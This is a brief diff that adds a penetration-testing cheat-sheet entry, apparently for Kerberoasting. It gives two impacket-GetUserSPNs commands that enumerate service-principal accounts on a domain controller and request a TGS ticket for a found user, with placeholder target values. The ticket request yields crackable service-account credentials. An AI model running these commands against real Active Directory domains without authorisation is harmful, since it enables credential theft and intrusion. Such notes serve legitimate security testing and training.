@@ -1,0 +1,5 @@
+Find an SPN accounts:
+  impacket-GetUserSPNs -dc-ip <TARGET_IP> <DOMAIN_NAME>/<USERNAME>
+
+Send a request to get a TGS ticket for the found user:
+  impacket-GetUserSPNs -dc-ip <TARGET_IP> <DOMAIN_NAME>/<USERNAME> -request-user <FOUND_USER>
